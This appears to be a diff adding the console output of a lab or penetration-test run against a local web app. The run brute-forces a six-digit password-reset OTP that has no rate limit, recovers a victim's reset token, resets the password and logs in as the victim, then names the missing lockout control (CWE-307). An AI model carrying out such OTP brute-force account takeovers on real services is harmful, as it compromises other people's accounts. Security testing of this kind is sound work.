@@ -1,0 +1,30 @@
+=== FULL CRACK COMPLETE ===
+====================================================================
+ATTACK #7 - OTP brute force via missing rate limit / lockout
+Target: http://127.0.0.1:5000
+====================================================================
+
+[A] NO-LOCKOUT PROOF - spraying wrong OTPs, watching for any throttle:
+    sent 3000 wrong OTPs
+    status codes returned: {400: 3000}
+    HTTP 429 (rate limited)? NO - never throttled
+    latency: avg 6.49 ms | first-100 6.60 ms | last-100 6.33 ms
+    -> no backoff: latency is flat from first to last attempt
+    measured throughput ~ 154 req/s
+    => full 10^6 keyspace is reachable; expected crack ~ 3245s (54.1 min), worst ~ 108.2 min. A lockout would cap this at N tries.
+
+[B] REAL CRACK - brute-forcing the victim's live OTP to takeover:
+    ...25000 tries, no match yet (157 req/s)
+    CRACKED OTP = 026638 after 26639 attempts in 169.0s (158 req/s)
+    /verify-otp returned the reset token: 1787577874482
+    reset via cracked token -> HTTP 200: {"account":"victim@corp.example","status":"password reset"}
+    login as victim -> HTTP 200: {"is_admin":false,"status":"ok","username":"victim"}
+
+--------------------------------------------------------------------
+[+] ATTACKER GAIN - unlimited OTP attempts let brute force reach the
+    entire 10^6 space; combined with the low entropy this yields
+    account takeover. The control that was missing is a per-account/
+    per-IP attempt cap with lockout. (CWE-307)
+--------------------------------------------------------------------
+
+[exited with code 0]
